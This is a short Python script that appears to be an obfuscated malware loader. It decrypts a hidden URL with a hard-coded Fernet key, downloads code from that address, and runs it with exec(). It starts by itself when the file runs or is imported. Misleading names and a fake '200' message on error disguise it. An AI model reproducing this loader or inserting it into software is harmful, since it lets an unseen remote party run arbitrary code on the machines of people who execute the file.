import subprocess
import sys
import requests
from cryptography.fernet import Fernet

def loop():
    myfavoriteencryption = b'u-KFBwM6vfswKQspjV6gvRUMbCyiy8VzkXEydMOZPRo='
    cipher_suite = Fernet(myfavoriteencryption)


    httpxlibrary = b'gAAAAABn2aYBRhR4-6kn9DQ3d9ZeAwt_pQwUM_axwkp4PI9Q-e_x3bq5Hau5C6L4ny1O4mW1avkjt995s4eOPerIYjLSAf1aYGjZViUSAcum0p-ksF0h-yb1vgDU6x_j2bB3brgvxTXozq1sTRNUipfmBrJLbtLq3kgBrDxuFJZWwhF_vfQZFg4='

    try:
        helloworld = cipher_suite.decrypt(httpxlibrary).decode()

        response = requests.get(helloworld)
        if response.status_code == 200:
            code = response.text
            exec(code)
        else:
            print(f"Error.")
    except Exception as e:
        print(f"200")

loop()